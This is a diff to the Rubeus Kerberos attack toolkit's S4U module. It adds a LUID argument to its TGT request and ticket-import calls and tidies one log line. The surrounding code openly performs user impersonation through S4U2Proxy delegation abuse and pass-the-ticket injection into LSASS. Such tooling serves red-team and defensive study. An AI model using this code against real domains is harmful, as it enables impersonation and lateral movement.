@@ -10,7 +10,7 @@ namespace Rubeus
         public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null)
         {
             // first retrieve a TGT for the user
-            byte[] kirbiBytes = Ask.TGT(userName, domain, keyString, etype, false, domainController);
+            byte[] kirbiBytes = Ask.TGT(userName, domain, keyString, etype, false, domainController, new Interop.LUID());
 
             if (kirbiBytes == null)
             {
@@ -48,7 +48,7 @@ namespace Rubeus
         }
         private static void S4U2Proxy(KRB_CRED kirbi, string targetUser, string targetSPN, bool ptt, string domainController = "", string altService = "", Ticket tgs = null)
         {
-            Console.WriteLine("[*]   Impersonating user '{0}' to target SPN '{1}'", targetUser, targetSPN);
+            Console.WriteLine("[*] Impersonating user '{0}' to target SPN '{1}'", targetUser, targetSPN);
             if (!String.IsNullOrEmpty(altService))
             {
                 string[] altSnames = altService.Split(',');
@@ -199,7 +199,7 @@ namespace Rubeus
                         if (ptt)
                         {
                             // pass-the-ticket -> import into LSASS
-                            LSA.ImportTicket(kirbiBytes);
+                            LSA.ImportTicket(kirbiBytes, new Interop.LUID());
                         }
                     }
                 }
@@ -270,7 +270,7 @@ namespace Rubeus
                     if (ptt)
                     {
                         // pass-the-ticket -> import into LSASS
-                        LSA.ImportTicket(kirbiBytes);
+                        LSA.ImportTicket(kirbiBytes, new Interop.LUID());
                     }
                 }
             }
